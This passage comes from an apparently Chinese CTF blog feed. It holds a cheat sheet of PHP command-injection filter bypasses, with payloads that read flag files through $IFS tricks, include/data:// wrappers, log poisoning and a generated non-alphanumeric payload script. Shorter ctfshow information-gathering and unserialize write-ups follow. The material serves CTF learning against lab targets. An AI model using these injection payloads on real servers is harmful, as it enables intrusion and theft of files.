class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里过滤了flag，我们可以使用一下两个方式进行绕过</p><p>对flag名进行处理</p><pre class="line-numbers language-none"><code class="language-none">system(&quot;cat fla&quot;&quot;g.php&quot;);system(&quot;cat fla&#39;&#39;g.php&quot;);system(&quot;cat f????????&quot;);system(&quot;cat f*&quot;);system(&quot;cat f&#x2F;lag.php&quot;);    &#x2F;&#x2F; 这里的转义字符只能在system中使用，而在实际环境中无法使用。c&#x3D;echo(&#96;nl%09fl[abc]*&#96;);payload7:c&#x3D;awk &#39;&#123;printf $0&#125;&#39; flag.php|| &#x2F;&#x2F; expr awk：通过expr和awk命令从其他的文件中获取字符并进 行命令构造。例如ctfs-wiki文件中存储了字符串www.ctfs-wiki.com，通 过“expr substr $(awk NR&#x3D;1 ctfs-wiki) 1 1”，可以获取ctfs-wiki文件中存储的第一个字符w。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用变量传递。</p><pre class="line-numbers language-none"><code class="language-none">$a&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&#39;cat flag&#39;);$a&#x3D;include($_GET[1]);&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;source&#x3D;flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="cat-绕过"><a href="#cat-绕过" class="headerlink" title="cat 绕过"></a>cat 绕过</h4><p>cat的替代有</p><pre class="line-numbers language-none"><code class="language-none">tacnlvimvimorelessgrepheadtailstrings%09f*&#x2F;bin&#x2F;c??                &#x2F;&#x2F; cat命令的存储位置bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span>   <span class="token comment">// 等同&#123;$IFS&#125;</span><span class="token punctuation">&#123;</span><span class="token variable">$IFS</span><span class="token punctuation">&#125;</span> <span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token punctuation">&#123;</span>cat<span class="token punctuation">,</span>flag<span class="token operator">.</span>php<span class="token punctuation">&#125;</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token operator">&lt;</span> <span class="token comment">// 重定向</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="当空格以及所有的linux读取命令被禁止"><a href="#当空格以及所有的linux读取命令被禁止" class="headerlink" title="当空格以及所有的linux读取命令被禁止"></a>当空格以及所有的linux读取命令被禁止</h3><pre class="line-numbers language-none"><code class="language-none">c&#x3D;highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>详细见此文章</p><p>参考链接：<a href="https://www.cxyzjd.com/article/qq_38154820/107171940">https://www.cxyzjd.com/article/qq_38154820/107171940</a></p><h3 id="分号的过滤"><a href="#分号的过滤" class="headerlink" title="分号的过滤"></a>分号的过滤</h3><p>这里主要利用了include的性质，?&gt;当作分号，可能和&lt;?php的闭合有关。我真不太懂。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[1]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[1]?>&amp;1=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>c=include$_GET[1]?>&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="日志包含配合UA头解决战斗"><a href="#日志包含配合UA头解决战斗" class="headerlink" title="日志包含配合UA头解决战斗"></a>日志包含配合UA头解决战斗</h3><p>通过包含，access文件来读取文件头部中代理信息，从而触发php代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=/var/log/nginx/access.log发送UA<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无字母shell"><a href="#无字母shell" class="headerlink" title="无字母shell"></a>无字母shell</h3><p>具体原理，我别的文章已经写过了。简要的说就是，利用异或，非运算通过非字母数字来构造字母数字的一种绕过方式。前提是，需要在eval中使用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a228128e-be2b-45ec-8926-4e36a576fcec.challenge.ctf.show:8080"</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>ans1<span class="token operator">=</span><span class="token string">""</span>ans2<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-'</span><span class="token punctuation">,</span>c<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>        <span class="token comment">#print(tmp.group(0))</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment"># eval("echo($c);");</span>mya<span class="token operator">=</span><span class="token string">"system"</span>  <span class="token comment">#函数名 这里修改！</span>myb<span class="token operator">=</span><span class="token string">"cat flag.php"</span>      <span class="token comment">#参数</span><span class="token keyword">def</span> <span class="token function">myfun</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>my<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> ans1    <span class="token keyword">global</span> ans2    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">|</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>my<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ans1<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                ans2<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>mya<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    myfun<span class="token punctuation">(</span>k<span class="token punctuation">,</span>mya<span class="token punctuation">)</span>data1<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>ans1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>ans2<span class="token operator">+</span><span class="token string">"\")"</span>ans1<span class="token operator">=</span><span class="token string">""</span>ans2<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>myb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    myfun<span class="token punctuation">(</span>k<span class="token punctuation">,</span>myb<span class="token punctuation">)</span>data2<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>ans1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>ans2<span class="token operator">+</span><span class="token string">"\")"</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span>data1<span class="token operator">+</span>data2<span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此外如果没有eval时怎么办。使用post上传文件，利用post文件会暂时存储在/temp的性质，之后利用条件竞争来进行绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requests<span class="token keyword">while</span> <span class="token constant boolean">True</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://f2b03d51-a47b-4e19-88d5-f400b8e6a711.challenge.ctf.show/?c=.+/???/????????[@-[]"</span>    r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'1.php'</span><span class="token punctuation">,</span> b<span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token operator">.</span>text<span class="token operator">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token operator">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里有&gt;/dev/null 2&gt;&amp;1，我们可以通过上面的管道符进行绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span>cat flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>      <span class="token comment">// 前面成功，后面不继续运行</span>c<span class="token operator">=</span>cat flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">(</span>回车<span class="token punctuation">)</span>c<span class="token operator">=</span>cat flag<span class="token operator">.</span>php<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">)</span>c<span class="token operator">=</span>cat flag<span class="token operator">.</span>php<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="system被过滤时怎么办"><a href="#system被过滤时怎么办" class="headerlink" title="system被过滤时怎么办"></a>system被过滤时怎么办</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//过59将其变为了数组。</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read/convert.base64-encode/resource=flag.txt</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 输出已经被定义的变量</span>也可以使用curl模拟get<span class="token operator">/</span>pot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>此外我们可以使用16进制表示php的一些函数。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token string double-quoted-string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等价于<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们再linux中要构造数字怎么办，使用$(())进行构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span>root@<span class="token constant">VM</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span>centos <span class="token operator">~</span><span class="token punctuation">]</span><span class="token comment"># echo $(())</span><span class="token number">0</span><span class="token punctuation">[</span>root@<span class="token constant">VM</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span>centos <span class="token operator">~</span><span class="token punctuation">]</span><span class="token comment"># echo ~$(())</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">[</span>root@<span class="token constant">VM</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span>centos <span class="token operator">~</span><span class="token punctuation">]</span><span class="token comment"># echo $(( ~$(())))</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">[</span>root@<span class="token constant">VM</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">16</span><span class="token operator">-</span>centos <span class="token operator">~</span><span class="token punctuation">]</span><span class="token comment"># echo ~$(($(( ~$(())))+$(( ~$(())))))</span><span class="token operator">~</span><span class="token operator">-</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当各种方式都不行时，不妨试一下mysql loadfile</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow信息搜集</title>
      <link href="/2021/09/29/ctfshow-xin-xi-sou-ji/"/>
      <url>/2021/09/29/ctfshow-xin-xi-sou-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="Web1-Web2"><a href="#Web1-Web2" class="headerlink" title="Web1, Web2"></a>Web1, Web2</h2><p>ctrl+u即可</p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>抓包，flag在回复中</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>没有思路，进入robots.txt看一看。</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>phps源码泄露，输入index.phps即可。</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>源码保存在<a href="http://www.zip,输入下载文件.查看到,有fl000g.txt,提示flag在这里.在路径中输入即可./">www.zip，输入下载文件。查看到，有fl000g.txt，提示flag在这里。在路径中输入即可。</a></p><p>php的备份有两种：*.php~和*.php.bak</p><h2 id="Web7，8"><a href="#Web7，8" class="headerlink" title="Web7，8"></a>Web7，8</h2><p>涉及.git、svn源码泄露，输入/.git/index.php</p><p>具体可详见<a href="https://www.cnblogs.com/xiaozi/p/12397114.html">https://www.cnblogs.com/xiaozi/p/12397114.html</a></p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p>进入index.php.swp即可</p><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>查看cookie即可</p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p><a href="https://zijian.aliyun.com/"> https://zijian.aliyun.com/</a></p><p>使用上述链接，查询ctfshow.com</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>进入网站，发现各种连接都没法使用。所以，想到进入robots.txt查看有/admin/。进入后，帐号为admin，密码为网页最后helpline。</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>页面最后的document</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>进入页面后，选择进入editor。然后选择插入文件，便可以查看目录，进入var/www/html/nothinghere/fl000g.txt</p><p>所以我们进入，nothinghere/fl000g.txt</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>通过最后的邮箱，获得qq邮箱，通过查询qq的地址。从而获得密码</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>根据题目描述，我们进入tz.php。然后进入phpinfo();之后查看$_SERVER[‘FLAG’]    ，便可以找到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>使用连接<a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p><p>排除hongkong的，第一个即最初ip</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>查看js源码，用score查找，发现当分数大于100时有下列unicode字符</p><p>“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”</p><p>解码得到，你赢了，去幺幺零点皮爱吃皮看看</p><p>进入/110.php即可</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>查看源码，发现密码经过aes加密，根据所给信息解密即可。</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>输入/db/db.mdb 即可</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>下次一定</title>
      <link href="/2021/09/28/xia-ci-yi-ding/"/>
      <url>/2021/09/28/xia-ci-yi-ding/</url>
      
        <content type="html"><![CDATA[<h2 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h2><h3 id="源文章："><a href="#源文章：" class="headerlink" title="源文章："></a>源文章：</h3><p>PHP反序列化/原生类的利用/__call()</p><h3 id="何时填坑"><a href="#何时填坑" class="headerlink" title="何时填坑"></a>何时填坑</h3><p>学了ssrf再说。</p><h3 id="问题出处"><a href="#问题出处" class="headerlink" title="问题出处"></a>问题出处</h3><p>从0开始ctf，php反序列化</p><h2 id="回调函数有啥用，怎么调用构造器，SimpleXMLElement"><a href="#回调函数有啥用，怎么调用构造器，SimpleXMLElement" class="headerlink" title="回调函数有啥用，怎么调用构造器，SimpleXMLElement"></a>回调函数有啥用，怎么调用构造器，SimpleXMLElement</h2><h3 id="源文章：-1"><a href="#源文章：-1" class="headerlink" title="源文章："></a>源文章：</h3><p>PHP反序列化/原生类的利用/__construct()</p><h3 id="何时填坑-1"><a href="#何时填坑-1" class="headerlink" title="何时填坑"></a>何时填坑</h3><p>java更加深入后。遇到具体题目再说。</p><h3 id="问题出处-1"><a href="#问题出处-1" class="headerlink" title="问题出处"></a>问题出处</h3><p>从0开始ctf，php反序列化</p><h2 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h2><p>[HCTF 2018]admin<br>[护网杯 2018]easy_tornado<br>]The mystery of ip  [<a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html]">https://www.cnblogs.com/wangtanzhi/p/12318630.html]</a><br>PHP-Audit-Labs</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>escapeshellarg()+escapeshellcmd() </p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a href="https://www.cnblogs.com/junlebao/p/14104036.html">https://www.cnblogs.com/junlebao/p/14104036.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 瞎扯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 瞎扯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unserialize-CTF题目</title>
      <link href="/2021/09/27/gong-fang-shi-jie-unserialize/"/>
      <url>/2021/09/27/gong-fang-shi-jie-unserialize/</url>
      
        <content type="html"><![CDATA[<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面后我们发现它的PHP代码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class xctf&#123;public $flag &#x3D; &#39;111&#39;;public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;?code&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，我们通过题目就知道本题为反序列化，并且可以通过这个魔术方法也可以进行知道本题考察的应为反序列化。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先，我们通过代码可以知道如果调用__Wakeup()会跳出程序，所以我们应当不调用这个方法。</p><p>我们通过这些信息，可以猜测输出payload的应该为__destruct()。</p><h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">xctf</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag_s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag_s</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 